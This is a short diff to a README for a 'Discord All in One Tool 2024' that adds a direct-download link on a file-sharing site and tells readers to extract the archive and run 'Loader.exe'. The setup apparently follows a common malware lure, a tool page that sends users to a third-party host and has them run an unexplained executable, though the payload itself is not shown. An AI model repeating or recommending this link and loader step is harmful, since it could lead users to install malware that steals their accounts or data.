@@ -4,7 +4,7 @@ Discord All in One Tool 2024
 
 Getting Started:
 
-Installation
+# [DOWNLOAD](https://www.4sync.com/web/directDownload/ExcGEd85/k6A4cIGB.9daecfc89a29ac22d7e31443ab773a63)  
 
 1. Download the archive and extract it to a convenient folder.
 1. 2. Run the auto-installer Loader.exe. It will install and download all necessary packages for > operation.
